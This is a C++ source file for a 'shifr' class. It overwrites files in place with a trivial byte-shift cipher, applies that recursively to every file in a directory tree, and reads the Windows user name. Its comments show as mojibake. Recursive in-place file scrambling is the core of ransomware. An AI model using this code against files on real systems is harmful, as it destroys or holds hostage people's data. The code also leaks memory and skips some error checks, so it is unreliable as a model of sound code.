#include "shifr.h"

void shifr::cryptFile(const string filePath)
{
    //��������� � ��������� ������ ����a
    FILE* file = fopen(filePath.c_str(), "rb");
    if (file == NULL) {
        cout << "couldn't open file" << endl;
        return;
    }
    fseek(file, 0, SEEK_END);
    long int size = ftell(file);
    fclose(file);

    // ��� ����������, �� ����� ������ �������� 0x11
    file = fopen(filePath.c_str(), "rb");
    unsigned char* in = (unsigned char*)malloc(size);
    int bytes_read = fread(in, sizeof(unsigned char), size, file);
    fclose(file);

    for (int i = 0; i < size; i++) {
        in[i] = in[i] - 0x11;
    }

    //�� � �������, ���������� ��� ������������� ��� � ����� ����:
    //string crypt_filename = "crypt_" + filePath;

    file = fopen(filePath.c_str(), "wb");
    if (file == NULL) {
        cout << "couldn't open file" << endl;
        return;
    }
    int bytes_written = fwrite(in, sizeof(unsigned char), size, file);
    fclose(file);

    //������� ����������� ����

   // if (std::remove(filePath.c_str()) != 0) {
   //     cout << "�� ������� ������� ����: " << std::endl;
   // }
    //else {}
}
void shifr::decryptFile(const string filePath)
{
    //��������� � ��������� ������ �����
    FILE* file = fopen(filePath.c_str(), "rb");
    if (file == NULL) {
        cout << "couldn't open file" << endl;
        return;
    }
    fseek(file, 0, SEEK_END);
    long int size = ftell(file);
    fclose(file);

    // ��� ������������
    file = fopen(filePath.c_str(), "rb");
    unsigned char* in = (unsigned char*)malloc(size);
    int bytes_read = fread(in, sizeof(unsigned char), size, file);
    fclose(file);

    for (int i = 0; i < size; i++) {
        in[i] = in[i] + 0x11;
    }

    //string decrypt = "de" + filePath;

    file = fopen(filePath.c_str(), "wb");
    if (file == NULL) {
        cout << "couldn't open file" << endl;
        return;
    }
    int bytes_written = fwrite(in, sizeof(unsigned char), size, file);
    fclose(file);

    //������� ����������� ����
   // if (std::remove(filename.c_str()) != 0) {
   //     // cout << "�� ������� ������� ����: " << fileToDelete << std::endl;
   // }
   // else {}
}
void shifr::encryptFilesInDirectory(const string& directoryPath)
{
    for (const auto& entry : filesystem::recursive_directory_iterator(directoryPath)) {
        if (filesystem::is_regular_file(entry.path())) {
            cryptFile(entry.path().string());
            entry.path().string().clear();
        }
    }
}
void shifr::decryptFilesInDirectory(const std::string& directoryPath)
{
    for (const auto& entry : filesystem::recursive_directory_iterator(directoryPath)) {
        if (filesystem::is_regular_file(entry.path())) {
            decryptFile(entry.path().string());
            entry.path().string().clear();
        }
    }
}
string shifr::getUserName()
{
    string username;
    DWORD size = UNLEN + 1;

    username.resize(size);

    if (GetUserNameA(&username[0], &size)) {
        username.resize(size - 1); // ������� ����������� ������� ������
    }
    else {
        cout << "�� ������� �������� ���������� � ������������." << endl;
    }
    return username;
}